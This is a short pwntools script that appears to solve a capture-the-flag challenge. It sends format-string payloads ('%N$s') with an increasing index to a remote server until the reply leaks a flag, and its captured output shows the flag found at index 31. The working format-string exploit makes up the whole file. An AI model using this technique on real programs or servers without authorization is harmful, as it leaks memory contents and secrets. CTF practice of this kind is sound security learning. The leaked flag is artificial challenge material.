from pwn import *

# reference: https://ctf.samsongama.com/ctf/binary/picoctf19-stringzz.html
index = 1
while True:
    print("Attempting index: {}".format(index))
    c = remote("124.16.75.117", 51001)
    c.sendline("%{}$s".format(index))
    index = index + 1
    try:
        res = c.recvall().decode()
    except:
        print("Failed to receive response")
        continue
    if "NeSE" in res:
        print("Found flag: {}".format(res))
        break
"""
Attempting index: 31
[+] Opening connection to 124.16.75.117 on port 51001: Done
[+] Receiving all data: Done (138B)
[*] Closed connection to 124.16.75.117 port 51001
Found flag: input whatever string you want; then it will be printed back:

Now 
your input 
will be printed:

NeSE{97cfff08ecef4b51a34d39ca3fd13f47}
"""
